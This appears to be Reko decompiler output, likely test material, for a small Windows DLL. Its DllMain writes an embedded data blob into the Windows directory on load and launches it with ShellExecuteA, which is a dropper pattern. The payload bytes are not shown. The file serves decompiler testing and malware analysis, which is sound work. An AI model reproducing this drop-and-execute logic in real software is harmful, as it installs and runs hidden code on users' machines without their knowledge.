// subject_reko_0000000000003000.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

Eq_4 g_t10003000 = 0x5438; // 10003000
void g_v10003004 = ??void??; // 10003004
// subject_text.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

CHAR g_t10001000 = 'o'; // 10001000
CHAR g_t10001014 = '\\'; // 10001014
word32 g_dw10001060 = 0x10AC; // 10001060
word32 g_dw10001064 = 4282; // 10001064
word32 g_dw10001068 = 0x10C8; // 10001068
word32 g_dw1000106C = 0x10E0; // 1000106C
word32 g_dw10001070 = 4332; // 10001070
word32 g_dw10001078 = 0x1106; // 10001078
<anonymous> * __imp__CloseHandle = &g_t10AC; // 10001080
<anonymous> * __imp__CreateFileA = &g_t10BA; // 10001084
<anonymous> * __imp__GetWindowsDirectoryA = &g_t10C8; // 10001088
<anonymous> * __imp__WriteFile = &g_t10E0; // 1000108C
<anonymous> * __imp__lstrcatA = &g_t10EC; // 10001090
<anonymous> * __imp__ShellExecuteA = &g_t1106; // 10001098
// 10001130: Register Eq_2 DllMain(Stack Eq_3 hModule, Stack Eq_4 dwReason, Stack Eq_5 lpReserved)
Eq_2 DllMain(Eq_3 hModule, Eq_4 dwReason, Eq_5 lpReserved)
{
	if (dwReason == 0x01)
	{
		GetWindowsDirectoryA(&g_t10001210, 0x0400);
		lstrcatA(&g_t10001210, &g_t10001014);
		if (fn1000118A(&g_t10001210) != 0x00)
			ShellExecuteA(null, &g_t10001000, &g_t10001210, null, null, 0x00);
	}
	return 0x01;
}

// 1000118A: Register word32 fn1000118A(Stack Eq_19 dwArg04)
// Called from:
//      DllMain
word32 fn1000118A(Eq_19 dwArg04)
{
	Eq_4 tLoc08;
	word32 ebx_15 = 0x00;
	Eq_3 eax_32 = CreateFileA(dwArg04, 0xC0000000, 0x03, null, 0x02, 0x00, null);
	if (eax_32 != (void *) ~0x00)
	{
		WriteFile(eax_32, &g_v10003004, g_t10003000, &tLoc08, null);
		CloseHandle(eax_32);
		ebx_15 = 0x01;
	}
	return ebx_15;
}

CHAR g_t10001210 = '\0'; // 10001210
